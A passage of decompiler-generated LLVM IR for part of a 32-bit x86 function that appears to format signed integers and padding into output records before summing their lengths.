  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_80557d0 ], [ 103, %dec_label_pc_80557ba ], [ 103, %dec_label_pc_80557b5 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80557eb

dec_label_pc_80557e1:                             ; preds = %dec_label_pc_80557d0.dec_label_pc_80557e1_crit_edge, %dec_label_pc_80557c5
  %v0_80557e1 = phi i32 [ %v0_80557e1.pre, %dec_label_pc_80557d0.dec_label_pc_80557e1_crit_edge ], [ %v0_80557b5, %dec_label_pc_80557c5 ]
  store i32 %v0_80557e1, i32* %ebx.global-to-local, align 4
  %v2_80557e3 = icmp slt i32 %v0_80557e1, 0
  %v1_80557e5 = icmp eq i1 %v2_80557e3, false
  br i1 %v1_80557e5, label %dec_label_pc_80557eb, label %dec_label_pc_80557e7

dec_label_pc_80557e7:                             ; preds = %dec_label_pc_80557e1
  %v0_80557e7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80557e7 = add i32 %v0_80557e7, -1
  store i32 %v1_80557e7, i32* %edx.global-to-local, align 4
  %v1_80557e8 = inttoptr i32 %v1_80557e7 to i8*
  store i8 48, i8* %v1_80557e8, align 1
  %v0_8055820.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80557eb

dec_label_pc_80557eb:                             ; preds = %dec_label_pc_80557e1, %dec_label_pc_80557dd, %dec_label_pc_80557e7
  %v1_805587b = phi i32 [ %v0_80557e1, %dec_label_pc_80557e1 ], [ %v0_8055820.pre, %dec_label_pc_80557e7 ], [ 0, %dec_label_pc_80557dd ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_80557e1 ], [ 102, %dec_label_pc_80557e7 ], [ %stack_var_-197.0, %dec_label_pc_80557dd ]
  %v2_80557eb = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80557eb, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8055806 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055806 = inttoptr i32 %v0_8055806 to i8*
  %v2_8055806 = load i8, i8* %v1_8055806, align 1
  %v3_8055806 = zext i8 %v2_8055806 to i32
  %v5_8055806 = and i32 %v2_80557eb, -256
  %v6_8055806 = or i32 %v3_8055806, %v5_8055806
  store i32 %v6_8055806, i32* %eax.global-to-local, align 4
  %v1_8055808 = add i32 %v0_8055806, 1
  store i32 %v1_8055808, i32* %edi.global-to-local, align 4
  store i32 %v6_8055806, i32* %stack_var_-22, align 4
  %v2_8055816 = sub i32 %v1_80557a3, %v1_8055808
  store i32 %v2_8055816, i32* %edx.global-to-local, align 4
  %v1_8055820 = icmp eq i32 %v1_805587b, 0
  %v2_8055820 = icmp slt i32 %v1_805587b, 0
  br i1 %v2_8055820, label %dec_label_pc_805586f, label %dec_label_pc_8055824

dec_label_pc_8055824:                             ; preds = %dec_label_pc_80557eb
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8055830 = sub i32 %v1_805587b, %v2_8055816
  %v8_8055830 = xor i32 %v2_8055816, %v1_805587b
  %v9_8055830 = xor i32 %v2_8055830, %v1_805587b
  %v10_8055830 = and i32 %v9_8055830, %v8_8055830
  %v11_8055830 = icmp slt i32 %v10_8055830, 0
  %v13_8055830 = icmp slt i32 %v2_8055830, 0
  %v2_8055832 = icmp eq i1 %v13_8055830, %v11_8055830
  br i1 %v2_8055832, label %dec_label_pc_8055834, label %dec_label_pc_8055868

dec_label_pc_8055834:                             ; preds = %dec_label_pc_8055824
  store i32 %v2_8055830, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8055830, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8055849, label %dec_label_pc_8055864

dec_label_pc_8055849:                             ; preds = %dec_label_pc_8055834
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8055864

dec_label_pc_8055864:                             ; preds = %dec_label_pc_8055834, %dec_label_pc_8055849
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8055849 ], [ %stack_var_-132, %dec_label_pc_8055834 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055884

dec_label_pc_8055868:                             ; preds = %dec_label_pc_8055824
  %v4_805586a = icmp eq i1 %v1_8055820, false
  br i1 %v4_805586a, label %dec_label_pc_8055875, label %dec_label_pc_805586c

dec_label_pc_805586c:                             ; preds = %dec_label_pc_8055868
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805586f

dec_label_pc_805586f:                             ; preds = %dec_label_pc_80557eb, %dec_label_pc_805586c
  %v0_80558b773 = phi i32 [ %v1_805587b, %dec_label_pc_80557eb ], [ -1, %dec_label_pc_805586c ]
  %v2_805586f = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805586f, i32* @ecx, align 4
  br label %dec_label_pc_8055884

dec_label_pc_8055875:                             ; preds = %dec_label_pc_8055868
  %v2_8055879 = add i32 %v1_8055808, %v1_805587b
  store i32 %v2_8055879, i32* %edi.global-to-local, align 4
  %v2_805587b = sub i32 %v2_8055816, %v1_805587b
  store i32 %v2_805587b, i32* %edx.global-to-local, align 4
  %v2_805587d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805587d, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055884

dec_label_pc_8055884:                             ; preds = %dec_label_pc_805586f, %dec_label_pc_8055864, %dec_label_pc_8055875
  %v0_80558b772 = phi i32 [ %v0_80558b773, %dec_label_pc_805586f ], [ -1, %dec_label_pc_8055864 ], [ -1, %dec_label_pc_8055875 ]
  %v0_80558a0 = phi i32 [ %v2_805586f, %dec_label_pc_805586f ], [ %storemerge10, %dec_label_pc_8055864 ], [ %v2_805587d, %dec_label_pc_8055875 ]
  %v0_8055891 = phi i32 [ %v2_8055816, %dec_label_pc_805586f ], [ 0, %dec_label_pc_8055864 ], [ %v2_805587b, %dec_label_pc_8055875 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_805588b = inttoptr i32 %v1_80554e3 to i8*
  %v3_805588b = load i8, i8* %v2_805588b, align 1
  %v4_805588b = and i8 %v3_805588b, 16
  %v5_805588b = icmp eq i8 %v4_805588b, 0
  %v1_805588f = icmp eq i1 %v5_805588b, false
  br i1 %v1_805588f, label %dec_label_pc_80558a0, label %dec_label_pc_8055891

dec_label_pc_8055891:                             ; preds = %dec_label_pc_8055884
  %v1_8055891 = icmp eq i32 %v0_8055891, 0
  %v1_8055893 = icmp eq i1 %v1_8055891, false
  br i1 %v1_8055893, label %dec_label_pc_80558a0, label %dec_label_pc_8055895

dec_label_pc_8055895:                             ; preds = %dec_label_pc_8055891
  br i1 %v12_80556f9, label %dec_label_pc_80558b7, label %dec_label_pc_805589c

dec_label_pc_805589c:                             ; preds = %dec_label_pc_8055895
  %v0_805589c = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_805589c, 1
  br i1 %tmp140, label %dec_label_pc_80558b7, label %dec_label_pc_80558a0

dec_label_pc_80558a0:                             ; preds = %dec_label_pc_805589c, %dec_label_pc_8055891, %dec_label_pc_8055884
  %v1_80558a0 = inttoptr i32 %v0_80558a0 to i32*
  store i32 112, i32* %v1_80558a0, align 4
  %v0_80558a6 = load i32, i32* @ecx, align 4
  %v1_80558a6 = add i32 %v0_80558a6, 4
  %v2_80558a6 = inttoptr i32 %v1_80558a6 to i32*
  store i32 1, i32* %v2_80558a6, align 4
  %v0_80558ad = load i32, i32* @ecx, align 4
  %v1_80558ad = add i32 %v0_80558ad, 8
  %v2_80558ad = inttoptr i32 %v1_80558ad to i32*
  store i32 ptrtoint (i32* @global_var_805e280.1014 to i32), i32* %v2_80558ad, align 4
  %v0_80558b4 = load i32, i32* @ecx, align 4
  %v1_80558b4 = add i32 %v0_80558b4, 12
  store i32 %v1_80558b4, i32* @ecx, align 4
  %v0_80558b7.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80558b7

dec_label_pc_80558b7:                             ; preds = %dec_label_pc_805589c, %dec_label_pc_8055895, %dec_label_pc_80558a0
  %v0_80558bc = phi i32 [ %v0_80558a0, %dec_label_pc_805589c ], [ %v0_80558a0, %dec_label_pc_8055895 ], [ %v1_80558b4, %dec_label_pc_80558a0 ]
  %v0_80558b7 = phi i32 [ %v0_80558b772, %dec_label_pc_805589c ], [ %v0_80558b772, %dec_label_pc_8055895 ], [ %v0_80558b7.pre, %dec_label_pc_80558a0 ]
  %v1_80558b7 = add i32 %v0_80558b7, 1
  %v8_80558b7 = icmp eq i32 %v1_80558b7, 0
  store i32 %v1_80558b7, i32* %ebx.global-to-local, align 4
  br i1 %v8_80558b7, label %dec_label_pc_80558d1, label %dec_label_pc_80558ba

dec_label_pc_80558ba:                             ; preds = %dec_label_pc_80558b7
  store i32 %v1_80558b7, i32* %eax.global-to-local, align 4
  %v1_80558bc = inttoptr i32 %v0_80558bc to i32*
  store i32 176, i32* %v1_80558bc, align 4
  %v0_80558c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80558c2 = sub i32 0, %v0_80558c2
  store i32 %v1_80558c2, i32* %eax.global-to-local, align 4
  %v1_80558c4 = load i32, i32* @ecx, align 4
  %v2_80558c4 = add i32 %v1_80558c4, 4
  %v3_80558c4 = inttoptr i32 %v2_80558c4 to i32*
  store i32 %v1_80558c2, i32* %v3_80558c4, align 4
  %v0_80558c7 = load i32, i32* @ecx, align 4
  %v1_80558c7 = add i32 %v0_80558c7, 8
  %v2_80558c7 = inttoptr i32 %v1_80558c7 to i32*
  store i32 ptrtoint (i32* @global_var_805e273.1013 to i32), i32* %v2_80558c7, align 4
  %v0_80558ce = load i32, i32* @ecx, align 4
  %v1_80558ce = add i32 %v0_80558ce, 12
  store i32 %v1_80558ce, i32* @ecx, align 4
  br label %dec_label_pc_80558d1

dec_label_pc_80558d1:                             ; preds = %dec_label_pc_80558b7, %dec_label_pc_80558ba
  %v0_80558d5 = phi i32 [ %v0_80558bc, %dec_label_pc_80558b7 ], [ %v1_80558ce, %dec_label_pc_80558ba ]
  %v0_80558d1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80558d1 = icmp eq i32 %v0_80558d1, 0
  br i1 %v1_80558d1, label %dec_label_pc_80558e4, label %dec_label_pc_80558d5

dec_label_pc_80558d5:                             ; preds = %dec_label_pc_80558d1
  %v1_80558d5 = inttoptr i32 %v0_80558d5 to i32*
  store i32 112, i32* %v1_80558d5, align 4
  %v0_80558db = load i32, i32* %edx.global-to-local, align 4
  %v1_80558db = load i32, i32* @ecx, align 4
  %v2_80558db = add i32 %v1_80558db, 4
  %v3_80558db = inttoptr i32 %v2_80558db to i32*
  store i32 %v0_80558db, i32* %v3_80558db, align 4
  %v0_80558de = load i32, i32* %edi.global-to-local, align 4
  %v1_80558de = load i32, i32* @ecx, align 4
  %v2_80558de = add i32 %v1_80558de, 8
  %v3_80558de = inttoptr i32 %v2_80558de to i32*
  store i32 %v0_80558de, i32* %v3_80558de, align 4
  %v0_80558e1 = load i32, i32* @ecx, align 4
  %v1_80558e1 = add i32 %v0_80558e1, 12
  store i32 %v1_80558e1, i32* @ecx, align 4
  br label %dec_label_pc_80558e4

dec_label_pc_80558e4:                             ; preds = %dec_label_pc_80558d1, %dec_label_pc_80558d5
  %v0_8055902 = phi i32 [ %v0_80558d5, %dec_label_pc_80558d1 ], [ %v1_80558e1, %dec_label_pc_80558d5 ]
  br i1 %v1_80556fe, label %dec_label_pc_80558f8, label %dec_label_pc_80558eb

dec_label_pc_80558eb:                             ; preds = %dec_label_pc_80558e4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_80558f2 = load i8, i8* %v2_805588b, align 1
  %v4_80558f2 = and i8 %v3_80558f2, 16
  %v5_80558f2 = icmp eq i8 %v4_80558f2, 0
  br i1 %v5_80558f2, label %dec_label_pc_8055915, label %dec_label_pc_80558f8

dec_label_pc_80558f8:                             ; preds = %dec_label_pc_80558eb, %dec_label_pc_80558e4
  %v0_80558f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80558fa = load i32, i32* %ebx.global-to-local, align 4
  %v2_80558fa = sub i32 %v0_80558f8, %v1_80558fa
  store i32 %v2_80558fa, i32* %eax.global-to-local, align 4
  %v1_80558fc = load i32, i32* %ebp.global-to-local, align 4
  %v2_80558fc = sub i32 %v2_80558fa, %v1_80558fc
  %v8_80558fc = xor i32 %v1_80558fc, %v2_80558fa
  %v9_80558fc = xor i32 %v2_80558fc, %v2_80558fa
  %v10_80558fc = and i32 %v9_80558fc, %v8_80558fc
  %v11_80558fc = icmp slt i32 %v10_80558fc, 0
  %v13_80558fc = icmp slt i32 %v2_80558fc, 0
  %v2_80558fe = icmp eq i1 %v13_80558fc, %v11_80558fc
  br i1 %v2_80558fe, label %dec_label_pc_8055915, label %dec_label_pc_8055900

dec_label_pc_8055900:                             ; preds = %dec_label_pc_80558f8
  %v2_8055900 = sub i32 %v1_80558fc, %v2_80558fa
  store i32 %v2_8055900, i32* %ebp.global-to-local, align 4
  %v1_8055902 = inttoptr i32 %v0_8055902 to i32*
  store i32 176, i32* %v1_8055902, align 4
  %v0_8055908 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055908 = load i32, i32* @ecx, align 4
  %v2_8055908 = add i32 %v1_8055908, 4
  %v3_8055908 = inttoptr i32 %v2_8055908 to i32*
  store i32 %v0_8055908, i32* %v3_8055908, align 4
  %v0_805590b = load i32, i32* @ecx, align 4
  %v1_805590b = add i32 %v0_805590b, 8
  %v2_805590b = inttoptr i32 %v1_805590b to i32*
  store i32 ptrtoint (i32* @global_var_805e273.1013 to i32), i32* %v2_805590b, align 4
  %v0_8055912 = load i32, i32* @ecx, align 4
  %v1_8055912 = add i32 %v0_8055912, 12
  store i32 %v1_8055912, i32* @ecx, align 4
  br label %dec_label_pc_8055915

dec_label_pc_8055915:                             ; preds = %dec_label_pc_80558f8, %dec_label_pc_80558eb, %dec_label_pc_8055900
  %v1_805599884 = phi i32 [ %v0_8055902, %dec_label_pc_80558f8 ], [ %v0_8055902, %dec_label_pc_80558eb ], [ %v1_8055912, %dec_label_pc_8055900 ]
  %v12_8055915 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8055915, label %dec_label_pc_805598b, label %dec_label_pc_805591c

dec_label_pc_805591c:                             ; preds = %dec_label_pc_8055915
  %v0_8055923 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055923 = icmp slt i32 %v0_8055923, 0
  %v1_8055925 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_8055923, i32* %edx.global-to-local, align 4
  br i1 %v2_8055923, label %dec_label_pc_8055934, label %dec_label_pc_805592b

dec_label_pc_805592b:                             ; preds = %dec_label_pc_805591c
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805593d

dec_label_pc_8055934:                             ; preds = %dec_label_pc_805591c
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_805593b = sub i32 0, %v0_8055923
  store i32 %v1_805593b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805593d

dec_label_pc_805593d:                             ; preds = %dec_label_pc_805592b, %dec_label_pc_8055934
  %v0_805595177 = phi i32 [ %v0_8055923, %dec_label_pc_805592b ], [ %v1_805593b, %dec_label_pc_8055934 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8055945 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8055945, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055951

dec_label_pc_8055951:                             ; preds = %dec_label_pc_8055951.backedge, %dec_label_pc_805593d
  %v0_805595f = phi i32 [ %v0_8055962, %dec_label_pc_8055951.backedge ], [ 2, %dec_label_pc_805593d ]
  %v0_805595b = phi i32 [ %v0_805595b.pre, %dec_label_pc_8055951.backedge ], [ %v2_8055945, %dec_label_pc_805593d ]
  %v0_8055951 = phi i32 [ %v9_8055959, %dec_label_pc_8055951.backedge ], [ %v0_805595177, %dec_label_pc_805593d ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8055958 = ashr i32 %v0_8055951, 31
  %v2_8055959 = zext i32 %v0_8055951 to i64
  %v4_8055959 = zext i32 %v1_8055958 to i64
  %v5_8055959 = mul nuw i64 %v4_8055959, 4294967296
  %v6_8055959 = or i64 %v5_8055959, %v2_8055959
  %v8_8055959 = sdiv i64 %v6_8055959, 10
  %v9_8055959 = trunc i64 %v8_8055959 to i32
  store i32 %v9_8055959, i32* %eax.global-to-local, align 4
  %v11_8055959 = srem i64 %v6_8055959, 10
  %v12_8055959 = trunc i64 %v11_8055959 to i8
  %v1_805595b = add i32 %v0_805595b, -1
  store i32 %v1_805595b, i32* %ebx.global-to-local, align 4
  %v1_805595c = add i8 %v12_8055959, 48
  %v1_805595f = add i32 %v0_805595f, 1
  store i32 %v1_805595f, i32* %esi.global-to-local, align 4
  %v3_8055960 = inttoptr i32 %v1_805595b to i8*
  store i8 %v1_805595c, i8* %v3_8055960, align 1
  %v0_8055962 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8055959, i32* %edx.global-to-local, align 4
  %v7_8055967 = icmp sgt i32 %v0_8055962, 3
  br i1 %v7_8055967, label %dec_label_pc_8055969, label %dec_label_pc_8055951.backedge

dec_label_pc_8055969:                             ; preds = %dec_label_pc_8055951
  %v2_8055969 = icmp eq i32 %v9_8055959, 0
  %v1_805596b = icmp eq i1 %v2_8055969, false
  br i1 %v1_805596b, label %dec_label_pc_8055951.backedge, label %dec_label_pc_805596d

dec_label_pc_8055951.backedge:                    ; preds = %dec_label_pc_8055969, %dec_label_pc_8055951
  %v0_805595b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055951

dec_label_pc_805596d:                             ; preds = %dec_label_pc_8055969
  %v0_805596d = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805596d, i32* %edx.global-to-local, align 4
  %v0_805596f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805596f = add i32 %v0_805596f, -2
  store i32 %v1_805596f, i32* %eax.global-to-local, align 4
  %v1_8055972 = trunc i32 %v0_805596d to i8
  %v3_8055972 = add i32 %v0_805596f, -1
  %v4_8055972 = inttoptr i32 %v3_8055972 to i8*
  store i8 %v1_8055972, i8* %v4_8055972, align 1
  %v5_8055975 = load i32, i32* %edx.global-to-local, align 4
  %v6_8055975 = and i32 %v5_8055975, -256
  %v7_8055975 = or i32 %v6_8055975, %stack_var_-42.0
  store i32 %v7_8055975, i32* %edx.global-to-local, align 4
  %v2_8055979 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055979 = add i32 %v2_8055979, -2
  %v4_8055979 = inttoptr i32 %v3_8055979 to i8*
  store i8 %v1_8055925, i8* %v4_8055979, align 1
  %v0_805597c = load i32, i32* @ecx, align 4
  %v1_805597c = inttoptr i32 %v0_805597c to i32*
  store i32 112, i32* %v1_805597c, align 4
  %v0_8055982 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055982 = load i32, i32* @ecx, align 4
  %v2_8055982 = add i32 %v1_8055982, 4
  %v3_8055982 = inttoptr i32 %v2_8055982 to i32*
  store i32 %v0_8055982, i32* %v3_8055982, align 4
  %v0_8055985 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055985 = load i32, i32* @ecx, align 4
  %v2_8055985 = add i32 %v1_8055985, 8
  %v3_8055985 = inttoptr i32 %v2_8055985 to i32*
  store i32 %v0_8055985, i32* %v3_8055985, align 4
  %v0_8055988 = load i32, i32* @ecx, align 4
  %v1_8055988 = add i32 %v0_8055988, 12
  store i32 %v1_8055988, i32* @ecx, align 4
  br label %dec_label_pc_805598b

dec_label_pc_805598b:                             ; preds = %dec_label_pc_8055915, %dec_label_pc_80555b0, %dec_label_pc_805596d
  %v0_8055a0c = phi i32 [ %v1_805599884, %dec_label_pc_8055915 ], [ %v2_80555b8, %dec_label_pc_80555b0 ], [ %v1_8055988, %dec_label_pc_805596d ]
  %v2_805598b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805598b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805598f

dec_label_pc_805598f:                             ; preds = %dec_label_pc_805598f, %dec_label_pc_805598b
  %v0_805598f = phi i32 [ %v2_805598b, %dec_label_pc_805598b ], [ %v1_8055991, %dec_label_pc_805598f ]
  %stack_var_-216.0 = phi i32 [ %v3_80554a3, %dec_label_pc_805598b ], [ %v5_8055994, %dec_label_pc_805598f ]
  %v1_805598f = inttoptr i32 %v0_805598f to i32*
  %v2_805598f = load i32, i32* %v1_805598f, align 4
  store i32 %v2_805598f, i32* %edx.global-to-local, align 4
  %v1_8055991 = add i32 %v0_805598f, 12
  store i32 %v1_8055991, i32* %eax.global-to-local, align 4
  %v5_8055994 = sub i32 %stack_var_-216.0, %v2_805598f
  %v7_8055998 = icmp ult i32 %v1_8055991, %v0_8055a0c
  br i1 %v7_8055998, label %dec_label_pc_805598f, label %dec_label_pc_805599c

dec_label_pc_805599c:                             ; preds = %dec_label_pc_805598f
  %v5_80559a5 = icmp eq i8 %stack_var_-26.0, 0
  %v1_80559b5 = icmp eq i1 %v5_80559a5, false
  %v2_80559b5 = zext i1 %v1_80559b5 to i32
  %v2_80559b8 = sub i32 %v5_8055994, %v2_80559b5
  store i32 %v2_80559b8, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_80559b8, i32* %eax.global-to-local, align 4
  store i32 %v0_8055a0c, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_80559b8, 1
  br i1 %tmp141, label %dec_label_pc_8055a0e, label %dec_label_pc_80559ce

dec_label_pc_80559ce:                             ; preds = %dec_label_pc_805599c
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_80559d5 = inttoptr i32 %v1_80554e3 to i8*
  %v3_80559d5 = load i8, i8* %v2_80559d5, align 1
  %v4_80559d5 = and i8 %v3_80559d5, 8
  %v5_80559d5 = icmp eq i8 %v4_80559d5, 0
  br i1 %v5_80559d5, label %dec_label_pc_80559f0, label %dec_label_pc_80559db

dec_label_pc_80559db:                             ; preds = %dec_label_pc_80559ce
  %v1_80559db = add i32 %v0_8055a0c, 12
  store i32 %v1_80559db, i32* %esi.global-to-local, align 4
  %v1_80559de = inttoptr i32 %v0_8055a0c to i32*
  store i32 160, i32* %v1_80559de, align 4
  %v0_80559e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80559e4 = load i32, i32* @ecx, align 4
  %v2_80559e4 = add i32 %v1_80559e4, 4
  %v3_80559e4 = inttoptr i32 %v2_80559e4 to i32*
  store i32 %v0_80559e4, i32* %v3_80559e4, align 4
  %v0_80559e7 = load i32, i32* @ecx, align 4
  %v1_80559e7 = add i32 %v0_80559e7, 8
  %v2_80559e7 = inttoptr i32 %v1_80559e7 to i32*
  store i32 ptrtoint (i32* @global_var_805e273.1013 to i32), i32* %v2_80559e7, align 4
  br label %dec_label_pc_8055a0e

dec_label_pc_80559f0:                             ; preds = %dec_label_pc_80559ce
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80559f7 = add i32 %tmp112, 16
  %v2_80559f7 = inttoptr i32 %v1_80559f7 to i32*
  %v3_80559f7 = load i32, i32* %v2_80559f7, align 4
  %v9_80559f7 = icmp eq i32 %v3_80559f7, 48
  %v1_80559fb = icmp eq i1 %v9_80559f7, false
  br i1 %v1_80559fb, label %dec_label_pc_8055a08, label %dec_label_pc_80559fd

dec_label_pc_80559fd:                             ; preds = %dec_label_pc_80559f0
  %v3_80559fd = load i32, i32* %stack_var_-152, align 4
  %v5_80559fd = add i32 %v3_80559fd, %v2_80559b8
  store i32 %v5_80559fd, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8055a0c

dec_label_pc_8055a03:                             ; preds = %dec_label_pc_8055a14
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055a3b

dec_label_pc_8055a08:                             ; preds = %dec_label_pc_80559f0
  br label %dec_label_pc_8055a0c

dec_label_pc_8055a0c:                             ; preds = %dec_label_pc_80559fd, %dec_label_pc_8055a08
  store i32 %v0_8055a0c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055a0e

dec_label_pc_8055a0e:                             ; preds = %dec_label_pc_805599c, %dec_label_pc_80559db, %dec_label_pc_8055a0c
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8055a10 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8055a10, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055a14

dec_label_pc_8055a14:                             ; preds = %dec_label_pc_8055a32, %dec_label_pc_8055a0e
  call void @__pseudo_call(i32 %tmp112)
  %v0_8055a2d = load i32, i32* %eax.global-to-local, align 4
  %v1_8055a2d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055a2d = add i32 %v1_8055a2d, 4
  %v3_8055a2d = inttoptr i32 %v2_8055a2d to i32*
  %v4_8055a2d = load i32, i32* %v3_8055a2d, align 4
  %v15_8055a2d = icmp eq i32 %v0_8055a2d, %v4_8055a2d
  %v1_8055a30 = icmp eq i1 %v15_8055a2d, false
  br i1 %v1_8055a30, label %dec_label_pc_8055a03, label %dec_label_pc_8055a32

dec_label_pc_8055a32:                             ; preds = %dec_label_pc_8055a14
  %v1_8055a32 = add i32 %v1_8055a2d, 12
  store i32 %v1_8055a32, i32* %ebx.global-to-local, align 4
  %v0_8055a35 = load i32, i32* %edi.global-to-local, align 4
  %v2_8055a35 = add i32 %v0_8055a35, %v0_8055a2d
  store i32 %v2_8055a35, i32* %edi.global-to-local, align 4
  %v1_8055a37 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055a37 = icmp ult i32 %v1_8055a32, %v1_8055a37
  br i1 %v7_8055a37, label %dec_label_pc_8055a14, label %dec_label_pc_8055a3b

dec_label_pc_8055a3b:                             ; preds = %dec_label_pc_8055a32, %dec_label_pc_8055a03
  %v0_8055a41 = phi i32 [ -1, %dec_label_pc_8055a03 ], [ %v2_8055a35, %dec_label_pc_8055a32 ]
  store i32 %v0_8055a41, i32* %eax.global-to-local, align 4
  %v2_8055a44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055a44, i32* @esi, align 4
  store i32 %v0_8055486, i32* @edi, align 4
  store i32 %v0_8055485, i32* @ebp, align 4
  ret i32 %v0_8055a41

; uselistorder directives
  uselistorder i32 %v0_8055a41, { 1, 0 }
  uselistorder i32 %v1_8055991, { 1, 2, 0 }
  uselistorder i32 %v0_805598f, { 1, 0 }
  uselistorder i32 %v0_8055a0c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8055962, { 1, 0 }
  uselistorder i32 %v9_8055959, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8055951, { 1, 0 }
  uselistorder i32 %v0_8055923, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80558fc, { 1, 0 }
  uselistorder i32 %v1_80558fc, { 1, 0, 2 }
  uselistorder i32 %v2_80558fa, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8055830, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8055816, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805587b, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_80557e1, { 0, 2, 1 }
  uselistorder i32 %v1_80557ba, { 1, 0 }
  uselistorder i32 %v0_80557b5, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8055782, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805577d, { 1, 0 }
  uselistorder i8 %v2_8055776, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8055776, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055700, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_80556e5, { 1, 0 }
  uselistorder i32 %v1_80556d1, { 1, 0 }
  uselistorder i32 %v0_80556c5, { 1, 0 }
  uselistorder i32 %v4_80556ac, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80556b1, { 1, 0 }
  uselistorder i32 %v2_805566f, { 1, 0, 2 }
  uselistorder i3 %v1_8055525, { 1, 0 }
  uselistorder i8 %v4_80555a4, { 1, 0 }
  uselistorder i32 %v3_80554e3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_80554e3, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_80554b5, { 1, 0 }
  uselistorder i32 %v3_80554a3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 0, 1, 3 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
